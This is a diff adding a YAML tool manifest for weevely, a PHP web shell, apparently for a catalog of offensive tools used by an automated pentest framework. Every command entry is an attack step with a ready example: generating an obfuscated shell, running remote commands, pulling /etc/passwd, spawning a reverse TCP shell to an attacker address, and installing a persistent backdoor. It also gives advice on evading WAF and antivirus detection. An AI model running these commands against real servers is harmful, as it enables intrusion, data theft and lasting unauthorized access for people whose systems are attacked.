@@ -1,0 +1,183 @@
+name: weevely
+version: "4.0.1"
+category: post_exploitation
+description: "Weaponized web shell for post-exploitation command execution and file system operations"
+
+capabilities:
+  - web_shell_generation
+  - remote_command_execution
+  - file_upload_download
+  - sql_console
+  - reverse_shell
+  - port_scanning
+  - network_discovery
+  - bruteforce_attacks
+  - password_cracking
+  - backdoor_persistence
+  - stealth_operations
+  - obfuscated_payload
+  - module_system
+
+target_compatibility:
+  os: [linux, macos, windows]
+  versions:
+    linux: ["Ubuntu 18.04+", "Debian 10+", "Kali 2018+"]
+    macos: ["macOS 10.13+"]
+    windows: ["Windows 10+"]
+  architecture: [x86_64]
+  target_servers: ["PHP 5+ web servers", "Apache", "Nginx", "IIS"]
+
+commands:
+  - name: generate_shell
+    description: "Generate obfuscated PHP web shell"
+    template: "weevely generate {password} {output_file}"
+    parameters:
+      password: {type: str, required: true, sensitive: true}
+      output_file: {type: path, required: true}
+    example: "weevely generate s3cr3t shell.php"
+    
+  - name: connect_shell
+    description: "Connect to deployed web shell"
+    template: "weevely {url} {password}"
+    parameters:
+      url: {type: str, required: true}
+      password: {type: str, required: true, sensitive: true}
+    example: "weevely http://target.com/shell.php s3cr3t"
+    
+  - name: execute_command
+    description: "Execute single command on target"
+    template: "weevely {url} {password} '{command}'"
+    parameters:
+      url: {type: str, required: true}
+      password: {type: str, required: true, sensitive: true}
+      command: {type: str, required: true}
+    example: "weevely http://target.com/shell.php s3cr3t 'ls -la'"
+    
+  - name: upload_file
+    description: "Upload file to target"
+    template: "weevely {url} {password} 'file_upload {local_file} {remote_path}'"
+    parameters:
+      url: {type: str, required: true}
+      password: {type: str, required: true, sensitive: true}
+      local_file: {type: path, required: true}
+      remote_path: {type: path, required: true}
+    example: "weevely http://target.com/shell.php pass 'file_upload tool.sh /tmp/tool.sh'"
+    
+  - name: download_file
+    description: "Download file from target"
+    template: "weevely {url} {password} 'file_download {remote_file} {local_path}'"
+    parameters:
+      url: {type: str, required: true}
+      password: {type: str, required: true, sensitive: true}
+      remote_file: {type: path, required: true}
+      local_path: {type: path, required: true}
+    example: "weevely http://target.com/shell.php pass 'file_download /etc/passwd passwd.txt'"
+    
+  - name: sql_console
+    description: "Interactive SQL console"
+    template: "weevely {url} {password} 'sql_console -user {db_user} -passwd {db_pass} -host {db_host}'"
+    parameters:
+      url: {type: str, required: true}
+      password: {type: str, required: true, sensitive: true}
+      db_user: {type: str, required: true}
+      db_pass: {type: str, required: true, sensitive: true}
+      db_host: {type: str, default: "localhost"}
+    example: "weevely http://target.com/shell.php pass 'sql_console -user root -passwd dbpass'"
+    
+  - name: reverse_tcp
+    description: "Spawn reverse TCP shell"
+    template: "weevely {url} {password} 'net_tcp_reverse {lhost} {lport}'"
+    parameters:
+      url: {type: str, required: true}
+      password: {type: str, required: true, sensitive: true}
+      lhost: {type: ip, required: true}
+      lport: {type: int, required: true}
+    example: "weevely http://target.com/shell.php pass 'net_tcp_reverse 10.10.10.10 4444'"
+    
+  - name: port_scan
+    description: "Scan ports from target"
+    template: "weevely {url} {password} 'net_scan {target} {ports}'"
+    parameters:
+      url: {type: str, required: true}
+      password: {type: str, required: true, sensitive: true}
+      target: {type: str, required: true}
+      ports: {type: str, required: true}
+    example: "weevely http://target.com/shell.php pass 'net_scan 192.168.1.1 80,443,22'"
+    
+  - name: find_writeable
+    description: "Find writeable directories"
+    template: "weevely {url} {password} 'find_writeable {path}'"
+    parameters:
+      url: {type: str, required: true}
+      password: {type: str, required: true, sensitive: true}
+      path: {type: path, default: "/var/www"}
+    example: "weevely http://target.com/shell.php pass 'find_writeable /var/www'"
+    
+  - name: backdoor_tcp
+    description: "Install persistent TCP backdoor"
+    template: "weevely {url} {password} 'backdoor_tcp {port}'"
+    parameters:
+      url: {type: str, required: true}
+      password: {type: str, required: true, sensitive: true}
+      port: {type: int, required: true}
+    example: "weevely http://target.com/shell.php pass 'backdoor_tcp 8080'"
+
+output_format:
+  type: interactive
+  log_format: text
+  supports_json: false
+
+requires_auth: false
+requires_root: false
+ports_required: []
+
+supersedes: []
+complements: [msfvenom, netcat, socat]
+
+known_issues:
+  - issue: "Requires PHP target with file upload or RCE vulnerability"
+    impact: high
+    workaround: "Exploit file upload or RCE vuln first to deploy shell"
+  - issue: "May be detected by WAF or AV"
+    impact: medium
+    workaround: "Use obfuscation, custom generation password"
+  - issue: "Some commands require specific PHP functions enabled"
+    impact: medium
+    workaround: "Check PHP configuration with phpinfo module"
+  - issue: "Network restrictions may limit outbound connections"
+    impact: medium
+    workaround: "Use file operations and inline commands"
+
+success_indicators:
+  - "weevely>"
+  - "Session.*opened"
+  - "File uploaded"
+  - "File downloaded"
+  - "Backdoor installed"
+  - "Connection established"
+
+failure_indicators:
+  - "Connection error"
+  - "Authentication failed"
+  - "Module not found"
+  - "Disabled function"
+  - "Permission denied"
+  - "404 Not Found"
+  - "WAF detected"
+
+installation:
+  apt: "apt install weevely"
+  pip: "pip install weevely"
+  github: "git clone https://github.com/epinna/weevely3 && cd weevely3 && pip install -r requirements.txt"
+  verify: "weevely --help"
+  post_install:
+    - "Test shell generation: weevely generate test test.php"
+    - "Review modules: weevely and type ':help'"
+
+effectiveness_baseline:
+  success_rate: 0.75
+  avg_execution_time: 2
+  false_positive_rate: 0.05
+  resource_usage: low
+  reliability: medium
+  notes: "Requires initial access; very useful for maintaining persistence on PHP targets"
